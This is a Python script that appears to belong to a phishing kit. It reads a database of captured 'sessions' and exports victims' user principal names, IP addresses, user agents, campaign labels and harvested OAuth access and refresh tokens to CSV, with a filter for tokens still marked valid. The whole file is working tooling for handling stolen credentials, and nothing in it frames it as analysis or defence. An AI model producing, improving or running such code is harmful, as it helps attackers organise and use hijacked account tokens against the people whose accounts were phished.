import argparse, csv, io, time
from datetime import datetime, timezone
from pathlib import Path
import db

COLUMNS = [
    "id","user_code","upn","template","campaign",
    "remote_ip","user_agent","status","validation","client_mode",
    "access_token","refresh_token",
    "created_at","created_iso",
    "expires_at","expires_iso",
    "token_expires","token_expires_iso",
    "last_validated","last_validated_iso",
]

def _iso(ts):
    if not ts: return ""
    try:
        return datetime.fromtimestamp(int(ts), tz=timezone.utc).isoformat()
    except Exception:
        return ""

def _row(r):
    out = dict(r)
    out["created_iso"]        = _iso(r.get("created_at"))
    out["expires_iso"]        = _iso(r.get("expires_at"))
    out["token_expires_iso"]  = _iso(r.get("token_expires"))
    out["last_validated_iso"] = _iso(r.get("last_validated"))
    return {k: out.get(k, "") for k in COLUMNS}

def fetch(status=None, campaign=None, since_seconds=None, only_valid=False):
    where, params = [], []
    if status:
        where.append("status = ?");       params.append(status)
    if campaign:
        where.append("campaign = ?");     params.append(campaign)
    if since_seconds:
        where.append("created_at >= ?");  params.append(int(time.time()) - since_seconds)
    if only_valid:
        where.append("validation = 'valid'")
    sql = "SELECT * FROM sessions"
    if where: sql += " WHERE " + " AND ".join(where)
    sql += " ORDER BY id DESC"
    with db.conn() as c:
        return [dict(x) for x in c.execute(sql, params).fetchall()]

def to_csv(rows, path):
    p = Path(path); p.parent.mkdir(parents=True, exist_ok=True)
    with p.open("w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=COLUMNS, extrasaction="ignore")
        w.writeheader()
        for r in rows: w.writerow(_row(r))
    return str(p)

def to_csv_string(rows):
    buf = io.StringIO()
    w = csv.DictWriter(buf, fieldnames=COLUMNS, extrasaction="ignore")
    w.writeheader()
    for r in rows: w.writerow(_row(r))
    return buf.getvalue()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--status"); ap.add_argument("--campaign")
    ap.add_argument("--since", type=int); ap.add_argument("--valid", action="store_true")
    ap.add_argument("--out", default=f"/opt/phish/exports/export_{int(time.time())}.csv")
    args = ap.parse_args()
    rows = fetch(args.status, args.campaign, args.since, args.valid)
    path = to_csv(rows, args.out)
    print(f"[+] {len(rows)} rows -> {path}")

if __name__ == "__main__":
    main()